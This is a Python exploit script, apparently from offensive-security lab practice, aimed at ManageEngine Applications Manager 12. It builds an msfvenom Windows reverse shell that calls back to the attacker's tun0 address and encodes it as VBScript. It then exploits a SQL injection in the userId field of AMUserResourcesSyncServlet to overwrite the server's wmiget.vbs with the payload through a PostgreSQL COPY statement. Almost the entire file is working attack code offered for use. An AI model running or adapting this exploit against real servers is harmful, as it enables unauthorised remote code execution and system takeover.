import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
import base64
import urllib
import subprocess
import netifaces as ni

import os

def base64_encode(s):
    encoded = base64.urlsafe_b64encode(s)
    return encoded.rstrip(b"=")
def base64_decode(s):
    padding = 4 - (len(s) % 4)
    s = s + ("=" * padding)
    return base64.urlsafe_b64decode(s)
wmiget = lambda SHELL_CODE: F'''
:On Error Resume Next:Set objWbemLocator = CreateObject("WbemScripting.SWbemLocator")::if Err.Number Then:WScript.Echo vbCrLf & "Error # " &             " " & Err.Description:End If:On Error GoTo 0::On Error Resume Next::::Select Case WScript.Arguments.Count:Case 2::strComputer = Wscript.Arguments(0):strQuery = Wscript.Arguments(1):Set wbemServices = objWbemLocator.ConnectServer      (strComputer,"Root\CIMV2")::      ::Case 4:strComputer = Wscript.Arguments(0):strUsername = Wscript.Arguments(1):strPassword = Wscript.Arguments(2):strQuery = Wscript.Arguments(3):Set wbemServices = objWbemLocator.ConnectServer      (strComputer,"Root\CIMV2",strUsername,strPassword)::       case 6:               strComputer = Wscript.Arguments(0):       strUsername = Wscript.Arguments(1):        strPassword = Wscript.Arguments(2):       strQuery = Wscript.Arguments(4):       namespace = Wscript.Arguments(5):       :       Set wbemServices = objWbemLocator.ConnectServer      (strComputer,namespace,strUsername,strPassword):Case Else:strMsg = "Error # in parameters passed":WScript.Echo strMsg:WScript.Quit(0)::End Select::::Set wbemServices = objWbemLocator.ConnectServer(strComputer, namespace, strUsername, strPassword)::if Err.Number Then:WScript.Echo vbCrLf & "Error # "  &             " " & Err.Description:End If::On Error GoTo 0::On Error Resume Next::::Set colItems = wbemServices.ExecQuery(strQuery)::if Err.Number Then:WScript.Echo vbCrLf & "Error # "  &             " " & Err.Description:End If:On Error GoTo 0:::i=0:For Each objItem in colItems:if i=0 then:header = "":For Each param in objItem.Properties_:header = header & param.Name & vbTab:Next:WScript.Echo header:i=1:end if:serviceData = "":For Each param in objItem.Properties_:serviceData = serviceData & param.Value & vbTab:Next:WScript.Echo serviceData:Next:{SHELL_CODE}:WScript.Quit(0):
'''
attacker_ip = ni.ifaddresses('tun0')[ni.AF_INET][0]['addr']

#subprocess.run(['msfvenom', '-a ', 'x86', '--platform', 'windows', '-p', 'windows/meterpreter/reverse_tcp', F'LHOST={attacker_ip}', 'LPORT=4444','-e', 'x86/shikata_ga_nai', '-f', 'vbs', '-o', 'shellcode.vbs'])
subprocess.run(['msfvenom', '-a ', 'x86', '--platform', 'windows', '-p', 'windows/shell_reverse_tcp', F'LHOST={attacker_ip}', 'LPORT=4445','-e', 'x86/shikata_ga_nai', '-f', 'vbs', '-o', 'shellcode.vbs'])


# strip newline, tabs, carriage returns, vbscript continuation chars
minify = R'''
sed 's/\x0D//g' shellcode.vbs | sed 's/\x09//g' |  awk 'BEGIN{RS="\1";ORS="";getline;gsub("_\\s?\n","");gsub("\n",":");gsub("::",":");print}' > shellcode-minified.vbs
'''
os.system(minify)

file = open('./shellcode-minified.vbs', 'r')
shellcode_minified = file.read()
file.close()

file = open('./payload-minified.vbs','w')
file.write(wmiget(shellcode_minified).strip('\n'))
file.close()

html_encoded = R'''
cat payload-minified.vbs | base64 | tr -d "\\n" | xxd -p | tr -d "\\n" | sed 's/../%&/g' > payload-minified-encoded.vbs
'''
# trim out newline from base64
html_encoded = R'''
cat payload-minified.vbs | base64 | tr -d "\\n" > payload-minified-encoded.vbs
'''

os.system(html_encoded)

file = open('./payload-minified-encoded.vbs', 'r')
payload_minified_encoded = file.read()
file.close()
squote_encoder = lambda s: s.replace('\'','$$')
query = lambda payload: squote_encoder(F";copy (select convert_from(decode('{payload}','base64'),'utf-8')) to 'C:\\\\Program Files (x86)\\\\ManageEngine\\\\AppManager12\\\\working\\\\conf\\\\\\\\application\\\\scripts\\\\wmiget.vbs';")
proxies = {
    'http': 'http://127.0.0.1:8080/',
    'https': 'https://127.0.0.1:8080/'
}
data = {
    "ForMasRange": "1",
    "userId":F"1{query(payload_minified_encoded)}"
}
print(data)
res = requests.post("http://manageengine:8443/servlet/AMUserResourcesSyncServlet", data = data, verify=False)
print(res.status_code)
print(res.content)
